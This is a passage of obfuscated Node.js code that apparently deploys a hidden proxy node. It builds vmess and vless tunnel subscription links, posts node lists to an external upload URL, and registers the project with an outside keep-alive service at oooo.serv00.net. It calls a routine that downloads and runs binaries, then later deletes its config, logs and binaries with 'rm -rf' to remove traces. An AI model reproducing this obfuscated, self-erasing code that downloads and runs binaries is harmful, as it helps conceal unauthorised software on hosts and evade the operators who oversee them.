_0x452945=_0x3ea9,_0x56171e={'v':'2','ps':''+_0x259a09,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x452945(_0x4a0cf5._0x5ee176),'net':'ws','type':_0x452945(_0x4a0cf5._0x5ee176),'host':_0x58c6cc,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x58c6cc,'alpn':'','fp':_0x452945(_0x4a0cf5._0x3739cd)},_0xef8a0d=_0x452945(_0x4a0cf5._0x414d97)+UUID+'@'+CFIP+':'+CFPORT+_0x452945(_0x4a0cf5._0x29c18b)+_0x58c6cc+'&fp=firefox&type=ws&host='+_0x58c6cc+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x259a09+_0x452945(0x235)+Buffer[_0x452945(_0x4a0cf5._0x14124c)](JSON[_0x452945(0x1ed)](_0x56171e))[_0x452945(_0x4a0cf5._0x3ccf66)](_0x452945(0x27b))+_0x452945(0x20b)+UUID+'@'+CFIP+':'+CFPORT+_0x452945(0x27f)+_0x58c6cc+_0x452945(0x22f)+_0x58c6cc+_0x452945(_0x4a0cf5._0x175b60)+_0x259a09+'\x0a\x20\x20\x20\x20';console[_0x452945(0x249)](Buffer[_0x452945(_0x4a0cf5._0x1396c7)](_0xef8a0d)['toString'](_0x452945(_0x4a0cf5._0x3a4dbc))),fs['writeFileSync'](subPath,Buffer['from'](_0xef8a0d)[_0x452945(0x1fa)]('base64')),console[_0x452945(_0x4a0cf5._0x4ac17a)](FILE_PATH+_0x452945(_0x4a0cf5._0x33125f)),uploadNodes(),app[_0x452945(_0x4a0cf5._0x1aeb53)]('/'+SUB_PATH,(_0x221b4f,_0x2bae89)=>{const _0x3fea99=_0x452945,_0x107e3d=Buffer[_0x3fea99(0x1f8)](_0xef8a0d)[_0x3fea99(0x1fa)](_0x3fea99(_0x19a8bb._0x3fe67a));_0x2bae89['set']('Content-Type',_0x3fea99(0x250)),_0x2bae89[_0x3fea99(_0x19a8bb._0x509657)](_0x107e3d);}),_0x5516b0(_0xef8a0d);},0x7d0);});}}async function uploadNodes(){const _0x41bef3={_0x22cf89:0x1d6,_0x44e849:0x25c,_0x1561c7:0x25a,_0x13d0b9:0x248,_0x4512c7:0x1ed,_0x166b9d:0x25c},_0x1fa3d0=_0xfb2e06;if(UPLOAD_URL&&PROJECT_URL){const _0x2a807d=PROJECT_URL+'/'+SUB_PATH,_0x29544f={'subscription':[_0x2a807d]};try{const _0x17c3e1=await axios[_0x1fa3d0(_0x41bef3._0x22cf89)](UPLOAD_URL+'/api/add-subscriptions',_0x29544f,{'headers':{'Content-Type':_0x1fa3d0(0x27c)}});return _0x17c3e1&&_0x17c3e1[_0x1fa3d0(_0x41bef3._0x44e849)]===0xc8?(console['log'](_0x1fa3d0(0x24e)),_0x17c3e1):null;}catch(_0x4a0cd7){if(_0x4a0cd7[_0x1fa3d0(_0x41bef3._0x1561c7)]){if(_0x4a0cd7['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1fa3d0(0x205)](listPath))return;const _0x1f30c2=fs[_0x1fa3d0(0x228)](listPath,'utf-8'),_0x1643fd=_0x1f30c2['split']('\x0a')[_0x1fa3d0(_0x41bef3._0x13d0b9)](_0x5615db=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1fa3d0(0x276)](_0x5615db));if(_0x1643fd['length']===0x0)return;const _0x54b422=JSON[_0x1fa3d0(_0x41bef3._0x4512c7)]({'nodes':_0x1643fd});try{const _0x348663=await axios[_0x1fa3d0(0x1d6)](UPLOAD_URL+_0x1fa3d0(0x26b),_0x54b422,{'headers':{'Content-Type':_0x1fa3d0(0x27c)}});return _0x348663&&_0x348663[_0x1fa3d0(_0x41bef3._0x166b9d)]===0xc8?(console[_0x1fa3d0(0x249)](_0x1fa3d0(0x242)),_0x348663):null;}catch(_0x8a4930){return null;}}else return;}}function cleanFiles(){const _0x259812={_0x568a8d:0x200,_0x10f425:0x202,_0x414cc3:0x238},_0x357e3d={_0x30ade6:0x249,_0x125cc9:0x249,_0x156a31:0x1dd},_0x1f6c01={_0x5b2402:0x1dd};setTimeout(()=>{const _0x5e9617=_0x3ea9,_0x2c8146=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2c8146[_0x5e9617(0x200)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2c8146[_0x5e9617(_0x259812._0x568a8d)](phpPath);process[_0x5e9617(_0x259812._0x10f425)]===_0x5e9617(0x210)?exec(_0x5e9617(_0x259812._0x414cc3)+_0x2c8146[_0x5e9617(0x1d8)]('\x20')+'\x20>\x20nul\x202>&1',_0x1a71d7=>{const _0x399969=_0x5e9617;console[_0x399969(0x25d)](),console['log'](_0x399969(0x1eb)),console['log'](_0x399969(_0x1f6c01._0x5b2402));}):exec('rm\x20-rf\x20'+_0x2c8146[_0x5e9617(0x1d8)]('\x20')+_0x5e9617(0x28a),_0x27be62=>{const _0x4f4dbd=_0x5e9617;console[_0x4f4dbd(0x25d)](),console[_0x4f4dbd(_0x357e3d._0x30ade6)](_0x4f4dbd(0x1eb)),console[_0x4f4dbd(_0x357e3d._0x125cc9)](_0x4f4dbd(_0x357e3d._0x156a31));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x102c1e={_0x43139a:0x249,_0x2c9040:0x1d6,_0xc52f3e:0x27c},_0x305e5c=_0xfb2e06;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x305e5c(_0x102c1e._0x43139a)](_0x305e5c(0x206));return;}try{const _0x307a7d=await axios[_0x305e5c(_0x102c1e._0x2c9040)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x305e5c(_0x102c1e._0xc52f3e)}});return console[_0x305e5c(0x249)](_0x305e5c(0x204)),_0x307a7d;}catch(_0x5a3339){return console[_0x305e5c(0x24a)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x5a3339[_0x305e5c(0x261)]),null;}}async function startserver(){const _0x58d2c5={_0x12842c:0x24a,_0x17b334:0x22e},_0x59e47a=_0xfb2e06;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xb42d){console[_0x59e47a(_0x58d2c5._0x12842c)](_0x59e47a(_0x58d2c5._0x17b334),_0xb42d);}}function _0x3ea9(_0x468af0,_0x793f0f){const _0x125b40=_0x125b();return _0x3ea9=function(_0x3ea934,_0x4ab0ad){_0x3ea934=_0x3ea934-0x1d5;let _0x24c557=_0x125b40[_0x3ea934];return _0x24c557;},_0x3ea9(_0x468af0,_0x793f0f);}startserver()[_0xfb2e06(0x1ee)](_0xd5f4de=>{const _0x53fb4e={_0x314238:0x24a},_0x291725=_0xfb2e06;console[_0x291725(_0x53fb4e._0x314238)]('Unhandled\x20error\x20in\x20startserver:',_0xd5f4de);}),app['listen'](PORT,()=>console['log'](_0xfb2e06(0x287)+PORT+'!'));
